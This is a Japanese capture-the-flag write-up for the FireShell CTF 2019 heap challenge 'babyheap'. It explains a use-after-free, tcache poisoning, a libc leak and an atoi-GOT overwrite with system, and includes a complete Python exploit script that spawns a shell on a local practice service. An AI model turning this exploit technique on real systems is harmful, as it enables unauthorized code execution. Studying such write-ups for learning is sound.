# [pwn 329pts] babyheap - FireShell CTF 2019
64ビットですがPIEやSSPは無効です。libcバイナリも渡されます。
```
$ checksec babyheap
[*] 'babyheap'
    Arch:       64 bits (little endian)
    NX:         NX enabled
    SSP:        SSP disabled (No canary found)
    RELRO:      Partial RELRO
    PIE:        PIE disabled
```

メモをCreate, Edit, Show, DeleteできるHeap系問題です。
グローバル変数で各機能が使用済みかチェックされるため各機能1回までしか使えませんが、DeleteするとCreateが使えるようになります。
また、IDAで解析すると隠し機能としてFillがあります。
FillはCreateとEditが一緒になった機能で、これも1度しか使えません。
libcのバージョンは比較的新しく、tcacheが搭載されているのでfastbinよりこちらが優先されます。

さて、各機能は1度きりですが、順番は決まっていません。
ということで、Create-->Delete-->EditとすることでUse After Freeが発生します。
これにより解放済みchunkのfdを書き換えてやればCreate後のFillで自由な領域へ書き込むことができます。

今回はFillでbssセクションに書き込み、機能の回数制限をしている変数を書き換えると同時にメモのポインタをatoiのGOTに向けます。
この状態でshowすることでlibc baseが取得できるので、次にDelete-->FillしてatoiのGOTにsystem関数のアドレスを書き込みます。
さらにメニューの選択肢で'/bin/sh\x00'を入力すれば`system('/bin/sh')`が実行されます。

```python
from ptrlib import *

def memo_create():
    sock.recvuntil("> ")
    sock.sendline("1")

def memo_edit(data):
    sock.recvuntil("> ")
    sock.sendline("2")
    sock.recvuntil("Content? ")
    sock.send(data)

def memo_show():
    sock.recvuntil("> ")
    sock.sendline("3")
    sock.recvuntil("Content: ")
    return sock.recvline()

def memo_delete():
    sock.recvuntil("> ")
    sock.sendline("4")

def memo_fill(data):
    sock.recvuntil("> ")
    sock.sendline("1337")
    sock.recvuntil("Fill ")
    sock.send(data)

elf = ELF("./babyheap")
libc = ELF("./libc-2.26.so")
sock = Socket("127.0.0.1", 2000)

memo_create()
memo_delete()
memo_edit(p64(0x6020a0))
memo_create()

payload = b''
payload += p64(0) # is_created
payload += p64(0) # is_edited
payload += p64(0) # is_shown
payload += p64(0) # is_deleted
payload += p64(0) # is_filled
payload += p64(elf.got("atoi")) # buf
memo_fill(payload)

addr_atoi = u64(memo_show()[:8].strip())
libc_base = addr_atoi - libc.symbol("atoi")
addr_system = libc_base + libc.symbol("system")
dump("libc base = " + hex(libc_base))

memo_edit(p64(addr_system))

sock.recvuntil("> ")
sock.send("/bin/sh\x00")
sock.interactive()
```

さすがに何回も復習した問題なので一瞬で解けました。

# 感想
シンプルながら面白い問題だと思います。
私はこの問題をやって以来Heap系問題にチャレンジするようになったので、Heap入門者向けでしょうか。
